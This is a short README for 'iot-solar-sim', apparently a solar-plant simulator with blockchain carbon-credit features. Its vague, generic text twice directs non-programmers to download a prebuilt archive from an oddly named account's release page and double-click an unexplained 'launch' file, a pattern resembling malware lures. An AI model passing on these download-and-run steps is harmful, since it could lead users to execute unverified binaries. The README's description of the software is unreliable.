## 🚀 Getting Started
Welcome to the iot-solar-sim project! This application allows you to simulate a grid-connected solar power plant. It provides telemetry data, computes daily and weekly summaries, and verifies carbon credits through blockchain technology. No programming skills are needed to start using this tool.

## 🛠️ Installation
To get started with iot-solar-sim, follow these simple steps:

1. Ensure your computer has the following minimum requirements:
   - Windows, macOS, or Linux operating system.
   - At least 4 GB of RAM.
   - 200 MB of free disk space.
   - Internet connection for downloading the application.

2. Visit the release page to download the application:
   [Download iot-solar-sim](https://github.com/Pabulumeyehole55/iot-solar-sim/releases).

3. Locate the latest version on the releases page. The files you may see include:
   - iot-solar-sim-windows.zip (for Windows users)
   - iot-solar-sim-macos.zip (for Mac users)
   - iot-solar-sim-linux.tar.gz (for Linux users)

4. Click on the version you want to download. Once the download completes, you will have a zip or tar file.

5. Extract the file using built-in extraction tools or applications like WinRAR or 7-Zip.

6. Open the extracted folder. You should see a file named `launch`.

7. Double-click on it to run the simulator.

## ⚙️ How It Works
The iot-solar-sim uses a deterministic approach to simulate solar power generation. It takes real-world data to create scenarios for a solar PV plant. Here's how it operates:
- **Telemetry Data Generation**: The application generates realistic data to help you monitor solar generation metrics.
- **Digest Computation**: Daily and weekly summaries provide insights into energy production.
- **Blockchain Integration**: By anchoring data to the blockchain, you can verify carbon credits easily.

## 🔎 Features
- Simulates real-time solar energy generation.
- Produces daily and weekly performance reports.
- Integrates blockchain for carbon credit verification.
- User-friendly interface designed for ease of use.
- Lightweight application that requires minimal system resources.

## 📥 Download & Install
To install the application, go to the following link:
[Download iot-solar-sim](https://github.com/Pabulumeyehole55/iot-solar-sim/releases).

Follow the installation steps outlined earlier. Once installed, you can start simulating your solar plants and generating emission data efficiently.
